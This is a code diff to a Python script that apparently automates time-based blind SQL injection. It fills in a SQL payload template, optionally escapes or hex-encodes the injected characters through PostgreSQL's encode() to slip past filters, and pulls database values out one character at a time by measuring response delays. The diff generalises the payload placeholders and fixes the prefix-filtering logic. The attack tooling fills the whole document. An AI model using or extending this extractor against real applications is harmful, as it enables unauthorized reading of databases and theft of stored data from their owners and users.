@@ -101,22 +101,28 @@ def _sanity_call(config):
         raise Exception("Sanity call failed")
 
 
-def _call_with_value(config, search_value, is_exact, is_activation):
+def _prepare_value(value, escape_value, encode_value):
+    if escape_value:
+        value = '\'' + ''.join(['\\' + ch for ch in value]) + '\''
+    elif encode_value:
+        value = ' || '.join(
+            ['\'\\\' || encode(\'\\x{:02x}\',\'escape\')'.format(ord(ch)) for ch in value])
+    else:
+        value = '\'' + value + '\''
+
+    return value
+
+
+def _call_with_value(config, search_value, prefix, char, index, is_exact, is_activation):
     valid_value = config.get(_CONFIG_INJECTED_PARAM_VALID_VALUE, '')
     time_threshold = config.get(_CONFIG_TIME_THRESHOLD, 0)
 
     escape_value = config.get(_CONFIG_ESCAPE_VALUE, _CONFIG_DEFAULT_ESCAPE_VALUE)
     encode_value = config.get(_CONFIG_ENCODE_VALUE, _CONFIG_DEFAULT_ENCODE_VALUE)
 
-    if escape_value:
-        search_value = '\'' + ''.join(['\\' + ch for ch in search_value]) + '\''
-
-    elif encode_value:
-        search_value = ' || '.join(
-            ['\'\\\' || encode(\'\\x' + format(ord(ch), 'x') + '\',\'escape\')' for ch in search_value])
-
-    else:
-        search_value = '\'' + search_value + '\''
+    search_value = _prepare_value(search_value, escape_value, encode_value)
+    prefix = _prepare_value(prefix, escape_value, encode_value)
+    char = _prepare_value(char, escape_value, encode_value)
 
     sql_payload = config.get(_CONFIG_SQL_PAYLOAD, _CONFIG_SQL_PAYLOAD_DEFAULT)
 
@@ -128,10 +134,15 @@ def _call_with_value(config, search_value, is_exact, is_activation):
         search_value = search_value + ' || \'%\''
         inner = config[_CONFIG_SQL_SEARCH]
 
-    value = valid_value + sql_payload. \
-        replace(':INNER:', inner). \
-        replace(':WAIT:', str(time_threshold)). \
-        replace(':VAL:', search_value)
+    value = valid_value + sql_payload \
+        .replace(':INNER:', inner) \
+        .replace(':WAIT:', str(time_threshold)) \
+        .replace(':VAL:', search_value) \
+        .replace(':PREFIX:', prefix) \
+        .replace(':CHR:', char) \
+        .replace(':IDX:', str(index)) \
+        .replace(':NXT:', str(index+1))
+
     return _call(config, value, time_threshold=time_threshold)
 
 
@@ -154,12 +165,13 @@ def _extract_data(config):
     logging.info("Starting search...")
     while len(detected_prefixes) > 0:
         prefix = detected_prefixes.pop()
-        if blacklist_prefix is not None and not prefix.upper().startswith(blacklist_prefix.upper()):
+        if blacklist_prefix is None or not prefix.upper().startswith(blacklist_prefix.upper()):
             if not single_value and len(prefix) > 0:
                 _logger.debug("Trying to see if {} is exact value".format(prefix))
-                if _call_with_value(config, prefix, True, False):
+                if _call_with_value(config, prefix, '', '', 0, True, False):
                     _logger.debug("Detected value {}".format(prefix))
-                    print('\r{}'.format(prefix), end='\n')
+                    print('\r{}                                                                                        '
+                          .format(prefix), end='\n')
                     detected_values.append(prefix)
 
             found_next = False
@@ -175,11 +187,11 @@ def _extract_data(config):
 
                 print('\r' + prefix + ch, end='')
 
-                is_correct = _call_with_value(config, prefix + ch, False, False)
+                is_correct = _call_with_value(config, prefix + ch, prefix, ch, len(prefix) + 1, False, False)
 
                 # Double check
                 if is_correct:
-                    is_correct = _call_with_value(config, prefix + ch, False, False)
+                    is_correct = _call_with_value(config, prefix + ch, prefix, ch, len(prefix) + 1, False, False)
 
                 if is_correct:
                     detected_prefixes.append(prefix + ch)
@@ -210,7 +222,7 @@ if __name__ == '__main__':
         _sanity_call(_config)
         if _CONFIG_SQL_ACTIVATION in _config:
             _logger.info("Running activation SQL")
-            _call_with_value(_config, '', False, True)
+            _call_with_value(_config, '', '', '', 0, False, True)
         if _CONFIG_SQL_SEARCH in _config:
             data = _extract_data(_config)
             print()
